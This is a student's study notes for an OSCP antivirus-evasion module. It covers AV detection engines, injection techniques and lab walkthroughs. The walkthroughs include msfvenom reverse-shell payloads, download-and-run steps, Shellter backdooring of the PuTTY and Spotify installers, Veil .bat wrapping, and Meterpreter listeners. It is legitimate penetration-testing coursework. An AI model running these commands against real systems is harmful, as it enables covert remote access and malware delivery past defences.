---
tags: OSCP Modules
---

# Module 15: Antivirus Evasion

## Tags
#OSCP #Module15 #AntivirusEvasion #AVBypass #AVEvasion #PowerShell #Shellter #Veil #Msfvenom #InMemoryInjection #RemoteProcessInjection #ProcessHollowing #ReflectiveDLLInjection #InlineHooking #EDR #SIEM #MachineLearning #Crypter #Obfuscator #Packer #VirusTotal #Kleenscan #Windows #StagedVsStageless #PEInjection #YARA #COMODO #Avira

---

## **Why This Module Matters**

Getting a shell is step one. Keeping it is a different problem.

Modern targets run antivirus. Sometimes that's just Windows Defender, sometimes something heavier like COMODO, Avira, or a full EDR stack. A payload that works perfectly on Kali often gets caught and quarantined before it executes on the target. This module is the answer to that.

The key shift in thinking: AV evasion isn't about finding a magic payload. It's about understanding *how* AV products detect code, then making deliberate choices that avoid those specific detection mechanisms. Signature-based detection looks for known byte sequences, so changing those bytes evades it. Heuristic detection looks for suspicious code patterns, so moving execution to memory (where there's less to scan) helps. ML detection watches for behavioral indicators, so anything that looks legitimate on-disk (a real Spotify installer, a real PuTTY binary) has a head start.

This module splits into two practical halves: understanding what you're up against (AV engines and detection methods), and the actual bypass techniques (PowerShell in-memory injection for scripted payloads, Shellter for PE-based delivery, and Veil for weaponising PowerShell as a double-clickable executable).

The delivery side (how the payload actually reaches the target) draws directly on [[Client-Side Attacks]] (user-triggered execution, pretexting) and [[Phishing Basics]] (the social engineering wrapper). This module covers "what happens once they click." Those earlier modules cover "how do you get them to click."

The shellcode generation here uses `msfvenom` with the same options already established in [[Fixing Exploits#14.1.4. Fixing the Exploit|14.1.4]] (bad characters, encoders, staged vs stageless). The tool feels familiar even though the use case is different.

---

## 15.1. Antivirus Software Key Components and Operations

### 15.1.1. Known vs Unknown Threats

AV started as purely reactive technology. A piece of malware got discovered, its unique identifier (a hash or a specific byte sequence) got added to a signature database, and future copies got blocked on sight. Fast. Reliable for known threats. Trivially bypassed by changing one byte (which produces a completely different hash).

The response was heuristic and then ML-based detection. Instead of "is this file in our blocklist?", the question becomes "does this file *behave* like something we'd block?" Better at catching novel threats, but more resource-intensive and often cloud-dependent.

**YARA** (open-sourced 2014) is the language underlying many modern signature databases. It lets analysts write flexible queries against malware repositories like VirusTotal, matching on byte patterns, strings, and metadata rather than just file hashes. Understanding YARA helps explain *why* changing specific strings in a payload evades detection: you're breaking the exact pattern a YARA rule is matching on.

**EDR** (Endpoint Detection and Response) is the layer above standalone AV. EDRs generate security-event telemetry (API calls, process trees, network connections, file writes) and feed it to a SIEM for centralised analysis. For a penetration tester, in-memory evasion alone isn't always enough if the EDR is watching your process's syscall patterns. Defeating a full EDR stack is out of scope for the OSCP, but worth knowing exists.

```mermaid
flowchart LR
    A["Original AV\nsignature/hash only"] --> B["Heuristic AV\ncode pattern analysis"]
    B --> C["Behaviour-based AV\nsandbox execution"]
    C --> D["ML-based AV\ncloud telemetry + local models"]
    D --> E["EDR\nfull telemetry, SIEM integration"]
    style A fill:#555,color:#fff
    style E fill:#8b0000,color:#fff
```

> 📸 Screenshot: the VirusTotal scan page for `malware.exe` — worth grabbing both the DETECTION tab (vendor count) and BEHAVIOR tab (what it actually does when run) for comparison

> 🔗 **YARA GitHub** (VirusTotal's repo, canonical language spec): [github.com/VirusTotal/yara](https://github.com/VirusTotal/yara)

#### Tags: #SignatureDetection #Heuristic #EDR #SIEM #YARA #VirusTotal #MachineLearning

---

### 15.1.2. AV Engines and Components

A modern AV isn't one scanner. It's a pipeline of seven concurrent engines, each watching a different attack surface. They work simultaneously and rank detected events as benign, malicious, or unknown.

1. **File Engine** — scheduled scans and real-time monitoring. Real-time detection uses Windows kernel-level mini-filter drivers to intercept file write operations *before* they complete. This is what catches a dropped payload the moment it touches disk.

2. **Memory Engine** — inspects process memory at runtime for known binary signatures or suspicious API call sequences. This is the main reason in-memory injection (15.2.2) is effective: if nothing written to disk is malicious, the file engine has nothing to catch.

3. **Network Engine** — monitors incoming/outgoing traffic at the local network interface. Primarily blocks known C2 communications, DNS-based beacons, and malicious downloads in transit.

4. **Disassembler** — translates machine code back into assembly, reconstructs code sections, and identifies encoding/decoding routines (the signature of a packed payload unpacking itself). This is how AV bypasses the first layer of a packer: it emulates the decode step, then scans the unpacked result.

5. **Emulator/Sandbox** — a safe isolated environment where a suspicious binary can actually run so the AV can watch what it does. Time-limited by necessity, which is why time-delayed execution is a known sandbox-evasion technique (sleep for 30+ seconds, then act).

6. **Browser Plugin** — extends AV visibility into content executing inside a browser (JavaScript, WebAssembly). Less relevant to this module's techniques but part of the full picture.

7. **Machine Learning Engine** — the cloud tier. When the local AV isn't confident, it uploads metadata to the vendor's cloud model for a verdict. Requires internet access, which is why restricted-connectivity production servers often run with degraded AV capability.

```mermaid
flowchart TD
    Event["File / network / process event triggers"]
    
    subgraph AV["AV Product — all seven run simultaneously"]
        FE["📄 File Engine\ninterceptss writes at kernel level"]
        ME["🧠 Memory Engine\nscans process memory at runtime"]
        NE["🌐 Network Engine\nmonitors traffic for C2 patterns"]
        DS["🔍 Disassembler\nrebuilds code, finds decode loops"]
        SB["🧪 Emulator/Sandbox\nexecutes in isolation, watches actions"]
        BP["🌐 Browser Plugin\nmonitors JS/WASM inside browser"]
        ML["☁️ ML Engine\ncloud verdict for uncertain cases"]
    end
    
    Event --> FE & ME & NE & DS & SB & BP & ML
    FE & ME & NE & DS & SB & BP & ML --> Verdict["Verdict: benign / malicious / unknown"]
```

> 📸 Screenshot: the Avira or COMODO AV interface on the Windows 11 VM — worth grabbing before testing evasion against it, so you have a reference for what the product looks like in normal state

> 🔍 **Worth remembering generally:** the Emulator/Sandbox is time-limited. Malware that sleeps longer than the sandbox runs (typically a few seconds) can fool behaviour-based detection entirely. Advanced malware often starts with an environment check specifically because of this. Not directly relevant to this module's techniques, but explains why modern evasion tooling goes deeper than just changing bytes.

#### Tags: #AVEngines #FileEngine #MemoryEngine #SandboxEmulator #Disassembler #MiniFilter

---

### 15.1.3. Detection Methods

**Signature-based detection** is the restricted-list model. Scans the filesystem for known malware signatures, from a specific file hash to a longer byte-pattern match. Defeated by changing any byte (new hash) or encoding the code (new byte pattern). The module demonstrates this directly: changing one character of a file with `xxd` and `sha256sum` produces a completely different hash.

**Heuristic-based detection** uses rules and algorithms to analyse code rather than match it. The disassembler decompiles and steps through instructions looking for dangerous patterns (e.g., `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread` in sequence, a textbook injection chain). Better than pure signatures at catching novel threats, more false positives, slower.

**Behaviour-based detection** actually *runs* the binary in the sandbox and watches what it does. Catches payloads that are encrypted at rest. The sandbox decrypts and executes them, revealing real behaviour. Defeated by sandbox-aware malware that checks for a real environment before acting.

**Machine Learning detection** applies statistical models to file metadata and execution telemetry. Windows Defender runs a local ML model; when uncertain, it queries a cloud model trained on a much larger dataset. Requires internet. A target with no outbound web access effectively runs without ML-tier AV capability.

```mermaid
flowchart LR
    SIG["Signature-based\nhash / byte pattern match"] --> HEU["Heuristic-based\ncode pattern analysis"]
    HEU --> BEH["Behaviour-based\nsandbox execution"]
    BEH --> ML["ML-based\nlocal model + cloud query"]

    SIG -.->|"Defeated by:\nchange any byte"| D1["❌"]
    HEU -.->|"Defeated by:\nobfuscate code patterns"| D2["❌"]
    BEH -.->|"Defeated by:\nsandbox detection / delay"| D3["❌"]
    ML -.->|"Defeated by:\nnovel payloads / no internet"| D4["❌"]
```

**Lab status: ✅ Completed** (Q1 & Q2 pure-recall):

| Question | Answer |
|---|---|
| Which AV engine is responsible for translating machine code into assembly? | **Disassembler** |
| Which AV detection method makes use of an engine that runs the executable from inside an emulated sandbox? | **Behaviour-based detection** |

> 🚩 **Hands-on, VM spin-up required** (Q3 VirusTotal scan): spin up VM #1 (Windows 11 / Avira), find `malware.exe` on the desktop, upload to [virustotal.com](https://www.virustotal.com/), check the **BEHAVIOR** tab for the flag. ⬜ Pending.

#### Tags: #SignatureDetection #HeuristicDetection #BehaviourDetection #MachineLearning #WindowsDefender #VirusTotal #Lab #Quiz #Module15

---

## 15.2. Bypassing Antivirus Detections

Two categories targeting different parts of the AV pipeline.

**On-disk evasion** changes what's written to disk so the file engine doesn't flag it. The payload still lands on the filesystem, just in a form AV doesn't recognise as malicious.

**In-memory evasion** sidesteps the file engine entirely. The payload goes straight from the network or a legitimate process into executable memory, never touching disk as malicious code. The memory engine is then the main threat, but it's generally harder to defeat than the file engine.

---

### 15.2.1. On-disk Evasion

Three core techniques, ranked by effectiveness against modern AV:

**Packers** compress a binary into a new executable with a new structure (and therefore a new hash), wrapping it in a decompression stub that unpacks the original at runtime. Originally invented for legitimate size reduction. Modern AVs flag well-known packers like UPX by name, and the disassembler engine can identify the unpacking routine and scan the decompressed payload anyway. Packers alone are not enough against modern AV.

**Obfuscators** reorganise and mutate code without changing its function: replacing instructions with semantically equivalent alternatives, inserting dead code (operations that don't affect output), splitting and reordering functions. Primarily used for intellectual property protection. Effective at breaking static signature byte patterns. Modern obfuscators increasingly include runtime in-memory capabilities, blurring the line with crypters.

**Crypters** encrypt the payload with a private key and include a decryption stub that restores the original payload in memory at runtime. Only the encrypted blob lives on disk. The actual malicious code never touches the filesystem in cleartext. The file engine only ever sees encrypted data, indistinguishable from an innocuous encrypted file. This is the most effective on-disk technique. Commercial tools like the Enigma Protector go to considerable lengths to make the decryption stub itself undetectable.

```mermaid
flowchart TD
    subgraph OnDisk["On-disk Evasion — ranked by effectiveness"]
        P["Packers\n● Compress into new structure\n● New hash evades hash-based sigs\n● Modern AV flags packer signatures directly\n⚠️ Weak alone"]
        O["Obfuscators\n● Mutate code, insert dead instructions\n● Breaks static byte-pattern matches\n● Doesn't change hash significantly\n⚠️ Moderate"]
        C["Crypters\n● Encrypt payload, stub decrypts at runtime\n● Only encrypted bytes on disk\n● File engine sees noise, not malware\n✅ Most effective"]
    end
    P --> C
    O --> C
```

> 📸 Screenshot: if testing an obfuscator or crypter output, the before/after `sha256sum` comparison makes the "one byte change = new hash" lesson concrete

> 🔗 **PayloadsAllTheThings** AV bypass section — packer/obfuscator/crypter examples and more (GitHub source, stable): [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass)

**Lab status: ✅ Completed** (Q1 pure-recall):

| Question | Answer |
|---|---|
| Which on-disk evasion technique makes use of code made by spurious instructions not part of the main execution? | **Obfuscators** — they insert dead code and spurious instructions to break static pattern detection without changing the payload's function. |

#### Tags: #OnDiskEvasion #Packer #Obfuscator #Crypter #EnigmaProtector #UPX

---

### 15.2.2. In-memory Evasion

In-memory techniques skip the file engine entirely. The trade-off: they're more complex to set up and they're now the primary target of memory engine and EDR telemetry monitoring.

**Remote Process Memory Injection** — the classic, and the basis for this module's PowerShell bypass in 15.3.2. Inject a payload into another running process using four standard Windows API calls in sequence:

1. `OpenProcess()` — get a HANDLE to the target process (requires appropriate privileges)
2. `VirtualAllocEx()` — allocate a writable+executable memory region inside the target process's address space
3. `WriteProcessMemory()` — copy shellcode into that allocated region
4. `CreateRemoteThread()` — create a new thread in the target process with its start address pointing at the injected shellcode

```mermaid
sequenceDiagram
    participant A as Attacker process
    participant T as Target process (e.g. explorer.exe)
    A->>T: OpenProcess() — obtain a HANDLE
    A->>T: VirtualAllocEx() — allocate RWX memory inside target
    A->>T: WriteProcessMemory() — copy shellcode into allocated region
    A->>T: CreateRemoteThread() — start new thread at shellcode address
    Note over T: shellcode executes inside the<br/>target process's address space
    T-->>A: reverse shell / C2 beacon
```

> 🔁 **Similar to:** the fundamental goal (controlling where execution jumps) is identical to the return-address overwrite in [[Fixing Exploits#14.1.1. Buffer Overflow in a Nutshell|14.1.1's buffer overflow]]. Both techniques redirect the CPU to attacker-controlled code; the method is different (memory corruption vs legitimate API calls), the goal is the same.

**Reflective DLL Injection** — loads a DLL from process memory rather than disk. The standard `LoadLibrary()` Windows API requires a file on disk. Attackers implement their own in-memory loader that handles the full DLL loading sequence (mapping sections, resolving imports, calling DllMain) without touching disk. More complex to implement but highly effective against file engines.

**Process Hollowing** — launch a legitimate process in a suspended state, hollow out its memory, replace it with malicious code, resume it. From the OS process list: `notepad.exe`. What's actually running: your payload.

```mermaid
flowchart LR
    A["CreateProcess() — launch svchost.exe suspended"] --> B["NtUnmapViewOfSection() — hollow out real image"]
    B --> C["VirtualAllocEx() — allocate space for malicious PE"]
    C --> D["WriteProcessMemory() — write malicious code"]
    D --> E["SetThreadContext() — point EIP at new entry point"]
    E --> F["ResumeThread() — malicious code runs as svchost.exe"]
    style F fill:#8b0000,color:#fff
```

**Inline Hooking** — installs a `jmp` instruction at the start of a target function in memory, redirecting execution to malicious code before the real function runs. Used in rootkits to intercept and hide system calls. Requires admin privileges to hook kernel functions. Notably, defensive tools (AV/EDR) use exactly the same technique, hooking `CreateRemoteThread`, `VirtualAllocEx`, etc. to inspect calls before they execute. Hooking is a sword that cuts both ways.

> 🔍 **Worth remembering generally:** AV products often detect injection by hooking the same Windows APIs attackers use. When an AV flags an injection attempt, it's often not the shellcode itself being identified. It's the API call sequence matching a known injection pattern. Changing the API sequence (e.g., `NtCreateThread` instead of `CreateRemoteThread`) is a common evasion refinement, out of scope here but worth knowing exists.

**Lab status: ✅ Completed** (Q1 & Q2 pure-recall):

| Question | Answer |
|---|---|
| When performing Remote Process Injection, which API copies the shellcode into the target thread? | **`WriteProcessMemory`** — copies the payload into the memory allocated by `VirtualAllocEx` inside the target process. |
| Between packers and crypters, which provides the highest level of stealth? | **Crypters** — payload is encrypted at rest on disk; only the decryption stub is visible, not the actual malicious code. Packers restructure but don't encrypt. |

#### Tags: #InMemoryEvasion #RemoteProcessInjection #ReflectiveDLLInjection #ProcessHollowing #InlineHooking #VirtualAllocEx #WriteProcessMemory #CreateRemoteThread #OpenProcess #Lab #Quiz #Module15

---

## 15.3. AV Evasion in Practice

### 15.3.1. Testing for AV Evasion — Best Practices

**The VirusTotal problem.** VirusTotal is fast and covers 60+ AV engines, but it explicitly forwards every uploaded sample to AV vendors for analysis. Within hours of submission, vendors sandbox the file, extract signatures, and release detections. If you upload a working bypass, you've handed it to the defenders. The bypass is dead before you've used it.

**Kleenscan as the alternative.** [kleenscan.com](https://kleenscan.com/) scans against ~30 engines without sharing samples with vendors. Four free scans per day. Use it when you don't know the target's AV vendor and need to check coverage without burning your bypass.

**Best practice: build a test VM.** If you know the target's AV (the OffSec labs tell you), spin up a local VM running that exact AV, disable automatic sample submission, and test directly. Unlimited attempts, bypass stays private, results are accurate to the real target environment.

How to disable automatic sample submission on Windows Defender:
- Settings → Virus & threat protection → Manage Settings → toggle off "Automatic Sample Submission"
- Or via PowerShell (admin): `Set-MpPreference -SubmitSamplesConsent 2`

**Prefer custom code.** AV signatures are extracted from malware samples. The more novel and unique your payload, the fewer existing detections match it. Copying known public shellcode is the fastest path to getting caught.

> 🔍 **Worth remembering generally:** "Automatic Sample Submission" means Windows Defender uploads uncertain files to Microsoft's cloud ML engine. Disabling it on your test VM means AV still runs locally (signatures, heuristics, local ML) but doesn't flag your bypass to Microsoft. This exactly mirrors a production server with restricted internet access, which is why it's the right test environment to build.

> 🔍 **Worth remembering generally:** any AV bypass has an expiry date. Vendor signature databases update continuously. A bypass that clears today may be detected by Friday. The more custom and unique the payload, the longer it tends to survive. Copied-from-GitHub shellcode has the shortest shelf life.

> 🔗 **HackTricks** AV bypass overview (GitHub source, bypasses the paywall — verify the path matches current repo structure): [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks) — search for "av bypass" within the repo

#### Tags: #TestingBestPractices #VirusTotal #Kleenscan #WindowsDefender #SampleSubmission #OPSEC #Module15

---

### 15.3.2. Evading AV with Thread Injection (PowerShell In-Memory Injection)

**Context:** Windows 11 target running Avira Free Security v1.1.68.29553. PowerShell is the delivery mechanism because scripts are interpreted text, not binary executables. There's no fixed byte sequence for AV to fingerprint the same way it would a compiled `.exe`. AV signatures targeting PowerShell look for known variable names, function names, and API call strings inside the script. Change those names and the signature stops matching.

#### Step 1: Generate the payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection -o bypass.ps1
```

The `-f psh-reflection` format produces a complete PowerShell script that:
- Imports `VirtualAlloc` (kernel32.dll), `CreateThread` (kernel32.dll), and `memset` (msvcrt.dll) via P/Invoke reflection
- Base64-decodes the embedded shellcode at runtime
- Allocates executable memory with `VirtualAlloc`
- Copies the shellcode using `memset`
- Spawns a new thread with `CreateThread` pointing at the shellcode

**The key detail:** every variable and function name is randomly generated each time. `xf`, `nfCl`, `uaQP` in the module's example. Different names on the next run. This is what breaks static string-signature detection. AV vendors can't blocklist `xf` because the next payload calls it something else entirely.

> 📸 Screenshot: the raw msfvenom output showing the PowerShell script with random variable names — worth capturing to confirm they differ on a second generation

#### Step 2: Transfer to target

```bash
# On Kali: serve the file
python3 -m http.server 8080

# On Windows target (PowerShell):
# Invoke-WebRequest -Uri http://<kali-ip>:8080/bypass.ps1 -OutFile bypass.ps1
# OR: certutil -urlcache -split -f http://<kali-ip>:8080/bypass.ps1 bypass.ps1
```

#### Step 3: Listener and execution

On Kali:
```bash
nc -lvnp 443
```

On the Windows target (PowerShell prompt):
```powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
.\bypass.ps1
```

```mermaid
sequenceDiagram
    participant K as Kali
    participant W as Windows 11 (Avira)
    K->>K: msfvenom ... -f psh-reflection -o bypass.ps1
    K->>K: python3 -m http.server 8080
    W->>K: Invoke-WebRequest → downloads bypass.ps1
    K->>K: nc -lvnp 443
    W->>W: Set-ExecutionPolicy Unrestricted
    W->>W: .\bypass.ps1 — VirtualAlloc + memset + CreateThread
    W-->>K: reverse shell lands on nc listener
    Note over K: plain nc catches it, no Metasploit stager needed
```

> 📸 Screenshot: the reverse shell landing on the nc listener — run `whoami` immediately inside the shell to confirm identity and capture both in one screenshot

> 🔁 **Similar to:** the msfvenom shellcode generation here uses the same tool, the same LHOST/LPORT options, and similar bad-character/encoder awareness as [[Fixing Exploits#14.1.4. Fixing the Exploit|14.1.4's Sync Breeze payload]]. The difference is output format: `-f c` for a C byte array that time, `-f psh-reflection` for a full PowerShell script here. Same underlying shellcode generation, different delivery wrapper.

> 🔍 **Worth remembering generally:** `psh-reflection` generates new random function and variable names every time you run `msfvenom`. If an AV engine starts flagging a specific script, regenerate rather than trying to manually rename things. The randomisation is built-in and more thorough than manual editing.

> 🔍 **Worth remembering generally:** this payload is `windows/shell_reverse_tcp` (stageless) — a plain `nc` listener catches it directly. Using a staged payload like `windows/meterpreter/reverse_tcp` would require a Metasploit `multi/handler` running instead. The stageless choice is deliberate for the same reason as [[Fixing Exploits#Module Exercise VM .23: Unknown service, memory corruption|Module 14's VM #3]]: fewer moving parts, works with plain netcat.

**Lab status: ✅ Completed** (Q1 pure-recall):

| Question | Answer |
|---|---|
| Which API have we used in our script to allocate memory for the shellcode? | **`VirtualAlloc`** — allocates a region of memory in the current process's address space. The P/Invoke declaration in the script: `[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(...)`. Distinct from `VirtualAllocEx` which allocates in a *remote* process. |

> 🚩 **Hands-on, VM spin-up required** (full PowerShell injection walkthrough — VM #1, Windows 11 / Avira):
> 1. Spin up VM #1, RDP in
> 2. Generate `bypass.ps1` on Kali with your actual tun0 IP
> 3. Serve it via `python3 -m http.server 8080`, download on Windows with `Invoke-WebRequest`
> 4. Start `nc -lvnp 443` on Kali
> 5. On Windows: `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`, then `.\bypass.ps1`
> 6. Confirm shell catches on Kali, run `whoami` to verify identity
> 7. Capture: screenshot of the listener catching the shell with `whoami` output visible ⬜ Pending.

#### Tags: #PowerShell #ThreadInjection #pshReflection #VirtualAlloc #CreateThread #Msfvenom #InMemoryEvasion #Lab #Quiz #Module15

---

### 15.3.3. Automating AV Evasion with Shellter

Manual payload crafting is slow and expertise-intensive. Shellter automates PE injection. It takes a legitimate Windows executable (a Spotify installer, a PuTTY binary) and injects shellcode into it without triggering the signature patterns that manually-modified PEs would.

**Why Shellter is harder to detect than naive PE modification:**
- Doesn't create new PE sections or change existing section permissions (creating a new executable section is a well-known AV red flag)
- Uses the PE's existing Import Address Table (IAT) entries to locate memory allocation, data transfer, and execution functions, keeping code flow looking legitimate
- Obfuscates both the injected payload and the decoder stub before writing
- Stealth Mode (optional) restores the original PE's execution flow after the payload runs, so the legitimate application still launches normally

#### Installation

```bash
sudo apt install shellter
sudo apt install wine
sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32:i386
# On ARM only: sudo apt install -y qemu-user-static binfmt-support (before wine32)
```

#### Workflow

```bash
shellter    # launches a wine-based console
```

1. Select **A** for Auto mode
2. Provide the path to a **32-bit** carrier PE (Shellter free version only handles 32-bit)
3. Enable **Stealth Mode** (Y) when prompted
4. Choose a payload from the built-in list, or enter custom shellcode
5. Configure LHOST / LPORT
6. Shellter tests the injection in-memory, then writes the modified PE to disk
7. Transfer the modified PE to the target and execute it

```mermaid
flowchart TD
    A["Legitimate 32-bit PE\ne.g. SpotifySetup.exe"] --> B["shellter — Auto mode"]
    B --> C["Shellter analyses PE structure\nand execution paths"]
    C --> D["Identifies injection points\nvia existing IAT entries"]
    D --> E["Obfuscates payload + decoder stub"]
    E --> F{Stealth Mode?}
    F -->|Yes| G["Preserves original PE execution flow\nlegitimate app still runs normally"]
    F -->|No| H["PE exits after payload executes"]
    G --> I["Modified PE written to disk"]
    H --> I
    I --> J["Transfer to target, execute"]
    J --> K["Payload runs, reverse shell back to Kali\nSpotify installer also appears to launch"]
    style K fill:#2e7d32,color:#fff
```

> 📸 Screenshot: Shellter's console output during the "Tracing..." / injection phase — confirms the PE structure was analysed and shellcode injected successfully

**Setting up a Meterpreter listener** (if using staged `windows/meterpreter/reverse_tcp`):
```bash
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <kali-ip>; set LPORT 443; run;"
```

**Expected session:**
```
[*] Sending stage (175174 bytes) to 192.168.50.62
[*] Meterpreter session 1 opened
meterpreter > shell
C:\Users\offsec\Desktop> whoami
client01\offsec
```

> 🔍 **Worth remembering generally:** the Shellter scan result (clean on Avira's quick scan) reflects the IAT-reuse technique working against *static* file scanning. A behaviour-based or ML scan after actual execution may tell a different story. That's exactly why the labs test against a live running AV on a real VM rather than just checking a static file scan result.

> 🔗 **Shellter official site** (free vs Pro comparison, download): [shellterproject.com](https://www.shellterproject.com/)
> 🔗 **PayloadsAllTheThings** AV bypass — covers Shellter and alternative PE carriers: [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Antivirus%20Bypass)

**Lab status: ✅ Completed** (Q1 pure-recall):

| Question | Answer |
|---|---|
| Which Shellter option restores the execution flow of the backdoored binary to avoid suspicion? | **Stealth Mode** — after the payload executes, Stealth Mode restores the original PE's execution flow so the carrier application (e.g. Spotify installer) appears to run normally, avoiding the immediate suspicion a process that silently exits would trigger. |

> 🚩 **Hands-on, VM spin-up required** (Shellter + Spotify, VM #1 — Windows 11 / Avira):
> 1. Download a 32-bit Spotify installer on Kali — check the module materials or Shellter's own site for a working download link (verify it's `PE32` not `PE32+` with `file SpotifySetup.exe`)
> 2. Run `shellter`, Auto mode, provide the installer path, Stealth Mode Y, choose `windows/meterpreter/reverse_tcp`, set LHOST/LPORT
> 3. Start `msfconsole` with `multi/handler` set to the same payload/LHOST/LPORT
> 4. Transfer the backdoored Spotify exe to VM #1 (HTTP server + certutil, or whatever transfer method the lab allows)
> 5. Execute on the Windows machine
> 6. Confirm Meterpreter session opens on Kali
> 7. Capture: Shellter injection output screenshot, Meterpreter session screenshot with `getuid` output ⬜ Pending.

#### Tags: #Shellter #PEInjection #IAT #StealthMode #Meterpreter #Wine #StagedVsStageless #Lab #Quiz #Module15

---

## 🏆 Capstone Labs

> 🚩 **Hands-on, VM spin-up required.** Two Module Exercise VMs — separate from the learning-unit VM (#1 / Windows 11 / Avira) used in the 15.3 walkthroughs above. Both targets run **COMODO** antivirus, a harder target than Avira. Both use an FTP server that auto-executes uploaded `.exe`/`.bat` files from its root directory every few seconds — you don't need a user to manually click anything, just get the file there.

---

### Capstone Lab 1: Shellter + PuTTY on Module Exercise VM #1 (COMODO AV)

> 🔧 Technique: Shellter + a 32-bit PuTTY executable as the carrier, Meterpreter reverse shell, delivered via FTP in active mode with binary encoding.

**Target:** Module Exercise VM #1 (COMODO AV), no credentials needed for FTP.

**Step 1: Download 32-bit PuTTY**
```bash
wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe -O ~/putty32.exe
file ~/putty32.exe    # confirm: PE32 executable (not PE32+/64-bit)
```

**Step 2: Shellter injection**
```bash
shellter
# A (Auto mode)
# PE path: /home/kali/putty32.exe
# Stealth Mode: Y
# Payload: windows/meterpreter/reverse_tcp (or whichever listed option)
# LHOST: <kali-tun0-ip>
# LPORT: 443
```

> 📸 Screenshot: Shellter's "PE Analysis" phase and successful injection confirmation

**Step 3: Set up the Meterpreter listener**
```bash
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <kali-ip>; set LPORT 443; run;"
```

**Step 4: Transfer via FTP (active mode, binary encoding)**
```bash
ftp <target-ip>
# at the ftp> prompt:
passive        # toggles to active mode if currently passive (ftp client will confirm)
binary         # required for .exe transfer — text mode corrupts binary files
put putty32.exe
quit
```

> 🔧 **FTP active mode note:** "active mode" means the server initiates the data connection back to the client. If `passive` reports "Passive mode off", you're in active mode. The exercise specifically requires this. Passive mode may not work with the lab's FTP server configuration.

> 📸 Screenshot: the FTP session confirming the binary upload completed, then the Meterpreter session opening on Kali

**Step 5: Catch the session and read the flag**
```
getuid
sysinfo
# navigate to flag location per the exercise's own instructions
# read the flag file — paste actual output here
```

> 📸 Screenshot: `getuid` and flag read output in the Meterpreter session

**Lab answer:** ⬜ Pending (flag value to be filled in after hands-on).

#### Tags: #ShellterCapstone #PuTTY #COMODO #Meterpreter #FTP #ActiveMode #BinaryEncoding #Lab #Module15 #Capstone

---

### Capstone Lab 2: Veil + Weaponised PowerShell on Module Exercise VM #2 (COMODO v12.2.2.8012)

> 🔧 Technique: generate a PowerShell AV bypass (msfvenom `psh-reflection`), use Veil to wrap it as a `.bat` file that can be auto-executed by the FTP server, deliver via FTP, catch the shell.

The problem this solves: a raw `.ps1` file can't be auto-executed by the FTP server (which looks for `.exe` or `.bat`), and can't be double-clicked by a user without opening in Notepad. Veil converts the PowerShell script into a `.bat` wrapper that runs the PowerShell payload when executed. COMODO scans `.bat` files differently from raw PowerShell, which is what makes this combination worth testing.

**Step 1: Install Veil**

> 🔍 **Worth doing first:** Veil installs a significant number of dependencies and can take several minutes. Run this before anything else in the session.

```bash
sudo apt install veil
# OR from source for the latest version:
git clone https://github.com/Veil-Framework/Veil.git ~/Veil
cd ~/Veil && sudo ./config/setup.sh --force --silent
```

> 📸 Screenshot: Veil's main menu interface on first launch — confirms installation succeeded

> 🔗 **Veil Framework GitHub** (official source, install instructions, payload list): [github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)

**Step 2: Generate the PowerShell payload**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<kali-ip> LPORT=443 -f psh-reflection -o ~/bypass.ps1
```

**Step 3: Use Veil to wrap as a .bat**
```bash
veil
# Use Veil's Evasion module to select a PowerShell-to-batch wrapper
# Provide the path to bypass.ps1 when prompted
# Note the output .bat file path
```

> 📸 Screenshot: Veil's output confirming the `.bat` file was generated, with the output file path visible

**Step 4: Set up listener**
```bash
nc -lvnp 443
```

**Step 5: Transfer via FTP**
```bash
ftp <target-ip>
passive     # toggle to active mode
binary      # binary encoding
put payload.bat
quit
```

> 📸 Screenshot: FTP upload confirming transfer, then the shell arriving on the nc listener

**Step 6: Confirm shell and read flag**
```
whoami
# navigate to flag location
# read flag — paste actual output here
```

> 📸 Screenshot: `whoami` and flag output in the shell

**Lab answer:** ⬜ Pending.

> 🔁 **Similar to:** the `.bat`-as-wrapper-for-PowerShell technique mirrors the delivery problem in [[Client-Side Attacks]] where direct script execution often requires user interaction or an execution policy bypass. Veil solves "how do I make a PowerShell script auto-run without the user knowing it's PowerShell" the same way a macro-enabled Office doc solves the equivalent phishing delivery problem.

#### Tags: #Veil #VeilFramework #BatchScript #PowerShell #COMODO #FTP #ActiveMode #Lab #Module15 #Capstone

---

## 15.4. Wrapping Up

This module covered the full stack:

- **How AV products work:** seven concurrent engines, four detection methods, and how defenders layer them to catch what individual methods miss.
- **On-disk evasion:** packers change the structure and hash (weak); obfuscators break static patterns (moderate); crypters encrypt the payload so only a decryption stub sits on disk (strongest).
- **In-memory evasion:** four techniques (remote process injection, reflective DLL injection, process hollowing, inline hooking), all designed to bypass the file engine by keeping malicious code in memory. EDRs specifically watch the API call patterns these rely on.
- **Testing discipline:** never submit to VirusTotal for real engagements (burns the bypass); use Kleenscan or a local test VM instead.
- **Practical bypasses:** PowerShell thread injection via `psh-reflection` (in-memory, random variable names), Shellter (automated PE injection, IAT reuse), Veil (converts PowerShell to a deliverable `.bat`).

```mermaid
flowchart TD
    Goal["Goal: execute payload on a target running AV"]
    Goal --> Q1{Where does the\npayload land?}
    Q1 -->|Must touch disk| OnDisk["On-disk evasion"]
    Q1 -->|Avoid disk entirely| InMem["In-memory evasion\n(15.2.2 techniques)"]
    OnDisk --> Q2{What does AV\ncheck on disk?}
    Q2 -->|Script files lenient| PSScript["PowerShell psh-reflection\n(15.3.2)"]
    Q2 -->|PE files but misses\nIAT-based injection| Shellter["Shellter PE injection\n(15.3.3)"]
